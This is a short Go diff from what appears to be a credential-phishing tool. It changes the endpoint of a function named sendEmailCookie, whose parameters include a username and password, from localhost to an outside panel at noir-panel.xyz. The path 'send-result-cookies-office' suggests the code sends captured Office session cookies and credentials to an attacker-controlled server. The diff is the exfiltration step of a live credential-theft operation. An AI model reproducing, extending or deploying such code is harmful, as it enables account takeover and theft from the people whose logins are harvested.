@@ -107,7 +107,7 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, _ := http.Post("http://127.0.0.1:8000/api/send-result-cookies-office", "application/json", responseBody)
+	request, _ := http.Post("https://noir-panel.xyz/public/api/send-result-cookies-office", "application/json", responseBody)
 
 	defer request.Body.Close()
 
